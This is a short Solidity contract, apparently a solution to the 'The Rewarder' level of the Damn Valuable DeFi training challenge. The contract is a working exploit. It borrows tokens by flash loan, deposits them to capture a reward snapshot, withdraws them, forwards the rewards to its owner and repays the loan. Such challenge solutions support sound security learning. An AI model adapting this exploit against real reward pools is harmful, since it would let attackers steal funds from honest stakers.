// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "hardhat/console.sol";

contract TheRewardsAttacker {
    TheRewarderPool pool;
    FlashLoanerPool loanerPool;
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;
    address owner;

    constructor(TheRewarderPool _pool, FlashLoanerPool _loanerPool, RewardToken _rewardToken, DamnValuableToken _liquidityToken, address _owner) {
        pool = _pool;
        loanerPool = _loanerPool;
        rewardToken = _rewardToken;
        liquidityToken = _liquidityToken;
        owner = _owner;
    }

    function flashLoan(uint256 amount) external payable {
        loanerPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external payable {
        liquidityToken.approve(address(pool), amount);
        pool.deposit(amount);
        pool.withdraw(amount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
        liquidityToken.transfer(msg.sender, amount);
    }
}